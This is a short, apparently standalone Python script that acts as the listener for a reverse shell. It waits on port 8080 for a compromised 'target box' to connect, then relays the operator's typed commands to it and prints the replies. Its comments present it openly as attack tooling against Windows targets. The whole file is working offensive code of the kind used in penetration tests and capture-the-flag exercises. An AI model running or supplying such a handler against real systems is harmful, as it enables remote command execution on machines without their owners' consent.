import socket
LISTEN_IP="0.0.0.0"
# Change this to whatever the target will try and connect to.
LISTEN_PORT=8080
BUFFER_SIZE=1024

# Set this higher if you're getting jank problems with recieved data getting messed up our out of sync...
tuning=0.1
import time

# set up out socket and start listening for those juicy requests.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((LISTEN_IP, LISTEN_PORT))
s.listen(1)
conn, addr = s.accept()
print("Connection from"+" "+str(addr))
# This reverse shell needs an inital enter to start working.
conn.send(b'\n')
while 1:
    data = ""
    # Give the target box a chance to send everything it's going to send.
    time.sleep(tuning)
    # Pull some stuff from the buffer.
    # Loop through if there's more than the buffer size in data, and stop when there's less than the buffer size (ie, we've emptied it)
    while 1:
        recv_data = conn.recv(BUFFER_SIZE)
        if not recv_data: break
        data += recv_data.decode()
        if len(recv_data) < BUFFER_SIZE: break
    if not data: break
    # Print out the response from the target without a newline, so we get a nice C:\><write command> prompt.
    print(data, end="")
    # Send out data, appending a \r\n so things work properly in windows land.
    tosend = input()
    if tosend == "exit_shell": break
    tosend = tosend + '\r\n'
    conn.send(tosend.encode("utf-8"))
conn.close()